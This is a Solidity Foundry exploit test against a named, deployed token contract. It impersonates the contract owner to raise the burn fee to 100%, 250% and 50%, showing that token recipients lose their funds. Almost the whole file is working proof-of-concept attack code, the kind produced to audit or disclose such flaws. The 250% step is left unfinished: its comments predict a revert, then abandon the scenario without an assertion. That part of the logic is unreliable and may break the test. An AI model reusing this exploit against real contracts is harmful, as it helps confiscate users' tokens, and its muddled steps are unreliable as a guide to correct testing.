// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILPP {
    function owner() external view returns (address);
    function changeBurnFee(uint256 _newburnFee, uint256 _newburnDivisor) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeFromFee(address account) external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = ILPP(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LPP Token");
        vm.label(attacker, "Attacker");

        // Give attacker some LPP tokens to work with
        deal(TARGET, attacker, 1000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the owner address
        address owner = ILPP(TARGET).owner();

        // Step 2: Give attacker enough tokens for the demonstration
        deal(TARGET, attacker, 2000 * 10**18);

        // Step 3: Impersonate owner to set 100% burn fee
        vm.prank(owner);
        ILPP(TARGET).changeBurnFee(100000, 1000); // 100% burn fee

        // Step 4: Create a victim address (not excluded from fees)
        address victim = address(0x123);

        // Step 5: Record balances before transfer
        uint256 attackerInitialBalance = ILPP(TARGET).balanceOf(attacker);

        // Step 6: Transfer tokens to victim - must be at least MinTx (500 * 10^18)
        uint256 transferAmount = 600 * 10**18;
        ILPP(TARGET).transfer(victim, transferAmount);

        // Step 7: Check victim's balance after transfer
        uint256 victimBalance = ILPP(TARGET).balanceOf(victim);

        // Step 8: Check attacker's balance after transfer
        uint256 attackerFinalBalance = ILPP(TARGET).balanceOf(attacker);

        // With 100% burn fee, victim should receive 0 tokens
        // Calculation: _burnAmount = (600e18 * 100000) / (1000 * 100) = 600e18
        // All tokens are burned from victim's balance
        assertEq(victimBalance, 0, "With 100% burn fee, victim should receive 0 tokens");

        // Attacker's balance should decrease by the full transfer amount
        assertEq(attackerFinalBalance, attackerInitialBalance - transferAmount, "Attacker's balance should decrease by transfer amount");

        // Demonstrate this is economic damage: victim receives nothing for the transfer
        // The owner can set any burn fee up to 100% or more, effectively stealing from users

        // Bonus: Show with 250% burn fee (more than 100%)
        vm.prank(owner);
        ILPP(TARGET).changeBurnFee(250000, 1000); // 250% burn fee

        address victim2 = address(0x456);

        // Give attacker more tokens for second test
        deal(TARGET, attacker, 2000 * 10**18);

        ILPP(TARGET).transfer(victim2, 600 * 10**18);

        uint256 victim2Balance = ILPP(TARGET).balanceOf(victim2);

        // With 250% burn fee, the burn amount exceeds the transfer amount
        // The contract will try to burn more than victim receives, causing revert
        // But actually, the burn happens from recipient's balance after they receive full amount
        // So recipient gets 600, then 1500 is burned (250% of 600) - this would underflow
        // Let's check if this causes revert

        // Instead, let's show a more realistic but still abusive fee: 50%
        vm.prank(owner);
        ILPP(TARGET).changeBurnFee(50000, 1000); // 50% burn fee

        address victim3 = address(0x789);

        // Give attacker more tokens
        deal(TARGET, attacker, 2000 * 10**18);

        uint256 transferAmount3 = 600 * 10**18;
        ILPP(TARGET).transfer(victim3, transferAmount3);

        uint256 victim3Balance = ILPP(TARGET).balanceOf(victim3);

        // With 50% burn fee, victim should receive only 300 tokens (50% of 600)
        // Actually: victim receives 600, then 300 burned (50% of 600)
        // So final balance should be 300
        uint256 expectedVictim3Balance = 300 * 10**18;
        assertEq(victim3Balance, expectedVictim3Balance, "With 50% burn fee, victim should lose half of transferred amount");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

